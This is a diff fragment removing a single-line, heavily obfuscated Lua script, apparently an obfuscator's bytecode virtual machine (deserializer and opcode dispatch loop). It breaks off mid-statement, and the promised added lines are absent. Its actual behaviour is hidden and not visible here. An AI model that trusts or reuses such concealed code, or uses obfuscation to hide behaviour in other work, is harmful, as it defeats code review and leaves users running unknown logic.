@@ -1,1 +1,1898 @@
-do local StrToNumber=tonumber;local Byte=string.byte;local Char=string.char;local Sub=string.sub;local Subg=string.gsub;local Rep=string.rep;local Concat=table.concat;local Insert=table.insert;local LDExp=math.ldexp;local GetFEnv=getfenv or function()return _ENV;end ;local Setmetatable=setmetatable;local PCall=pcall;local Select=select;local Unpack=unpack or table.unpack ;local ToNumber=tonumber;local function VMCall(ByteString,vmenv,...)local DIP=1;local repeatNext;ByteString=Subg(Sub(ByteString,5),"..",function(byte)if (Byte(byte,2)==79) then repeatNext=StrToNumber(Sub(byte,1,1));return "";else local a=Char(StrToNumber(byte,16));if repeatNext then local b=Rep(a,repeatNext);repeatNext=nil;return b;else return a;end end end);local function gBit(Bit,Start,End)if End then local Res=(Bit/(2^(Start-1)))%(2^(((End-1) -(Start-1)) + 1)) ;return Res-(Res%1) ;else local Plc=2^(Start-1) ;return (((Bit%(Plc + Plc))>=Plc) and 1) or 0 ;end end local function gBits8()local a=Byte(ByteString,DIP,DIP);DIP=DIP + 1 ;return a;end local function gBits16()local a,b=Byte(ByteString,DIP,DIP + 2 );DIP=DIP + 2 ;return (b * 256) + a ;end local function gBits32()local a,b,c,d=Byte(ByteString,DIP,DIP + 3 );DIP=DIP + 4 ;return (d * 16777216) + (c * 65536) + (b * 256) + a ;end local function gFloat()local Left=gBits32();local Right=gBits32();local IsNormal=1;local Mantissa=(gBit(Right,1,20) * (2^32)) + Left ;local Exponent=gBit(Right,21,31);local Sign=((gBit(Right,32)==1) and  -1) or 1 ;if (Exponent==0) then if (Mantissa==0) then return Sign * 0 ;else Exponent=1;IsNormal=0;end elseif (Exponent==2047) then return ((Mantissa==0) and (Sign * (1/0))) or (Sign * NaN) ;end return LDExp(Sign,Exponent-1023 ) * (IsNormal + (Mantissa/(2^52))) ;end local function gString(Len)local Str;if  not Len then Len=gBits32();if (Len==0) then return "";end end Str=Sub(ByteString,DIP,(DIP + Len) -1 );DIP=DIP + Len ;local FStr={};for Idx=1, #Str do FStr[Idx]=Char(Byte(Sub(Str,Idx,Idx)));end return Concat(FStr);end local gInt=gBits32;local function _R(...)return {...},Select("#",...);end local function Deserialize()local Instrs={};local Functions={};local Lines={};local Chunk={Instrs,Functions,nil,Lines};local ConstCount=gBits32();local Consts={};for Idx=1,ConstCount do local Type=gBits8();local Cons;if (Type==1) then Cons=gBits8()~=0 ;elseif (Type==2) then Cons=gFloat();elseif (Type==3) then Cons=gString();end Consts[Idx]=Cons;end Chunk[3]=gBits8();for Idx=1,gBits32() do local Descriptor=gBits8();if (gBit(Descriptor,1,1)==0) then local Type=gBit(Descriptor,2,3);local Mask=gBit(Descriptor,4,6);local Inst={gBits16(),gBits16(),nil,nil};if (Type==0) then Inst[3]=gBits16();Inst[4]=gBits16();elseif (Type==1) then Inst[3]=gBits32();elseif (Type==2) then Inst[3]=gBits32() -(2^16) ;elseif (Type==3) then Inst[3]=gBits32() -(2^16) ;Inst[4]=gBits16();end if (gBit(Mask,1,1)==1) then Inst[2]=Consts[Inst[2]];end if (gBit(Mask,2,2)==1) then Inst[3]=Consts[Inst[3]];end if (gBit(Mask,3,3)==1) then Inst[4]=Consts[Inst[4]];end Instrs[Idx]=Inst;end end for Idx=1,gBits32() do Functions[Idx-1 ]=Deserialize();end return Chunk;end local function Wrap(Chunk,Upvalues,Env)local Instr=Chunk[1];local Proto=Chunk[2];local Params=Chunk[3];return function(...)local Instr=Instr;local Proto=Proto;local Params=Params;local _R=_R;local VIP=1;local Top= -1;local Vararg={};local Args={...};local PCount=Select("#",...) -1 ;local Lupvals={};local Stk={};for Idx=0,PCount do if (Idx>=Params) then Vararg[Idx-Params ]=Args[Idx + 1 ];else Stk[Idx]=Args[Idx + 1 ];end end local Varargsz=(PCount-Params) + 1 ;local Inst;local Enum;while true do Inst=Instr[VIP];Enum=Inst[1];if (Enum<=156) then if (Enum<=77) then if (Enum<=38) then if (Enum<=18) then if (Enum<=8) then if (Enum<=3) then if (Enum<=1) then if (Enum>0) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum>2) then Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));end elseif (Enum<=5) then if (Enum==4) then local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]/Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] * Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];end elseif (Enum<=6) then local A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);elseif (Enum==7) then local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=13) then if (Enum<=10) then if (Enum>9) then local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=11) then local A=Inst[2];do return Unpack(Stk,A,Top);end elseif (Enum==12) then local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A=Inst[2];local Results={Stk[A](Stk[A + 1 ])};local Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end end elseif (Enum<=15) then if (Enum>14) then local A=Inst[2];local Cls={};for Idx=1, #Lupvals do local List=Lupvals[Idx];for Idz=0, #List do local Upv=List[Idz];local NStk=Upv[1];local DIP=Upv[2];if ((NStk==Stk) and (DIP>=A)) then Cls[DIP]=NStk[DIP];Upv[1]=Cls;end end end else local A=Inst[2];local T=Stk[A];for Idx=A + 1 ,Inst[3] do Insert(T,Stk[Idx]);end end elseif (Enum<=16) then local Edx;local Results,Limit;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum>17) then VIP=Inst[3];else local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];end elseif (Enum<=28) then if (Enum<=23) then if (Enum<=20) then if (Enum==19) then local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];do return Stk[Inst[2]];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];end elseif (Enum<=21) then local Edx;local Results;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum==22) then Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]%Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]%Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];if (Inst[2]<Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=25) then if (Enum==24) then local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Env[Inst[3]]=Stk[Inst[2]];end elseif (Enum<=26) then local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 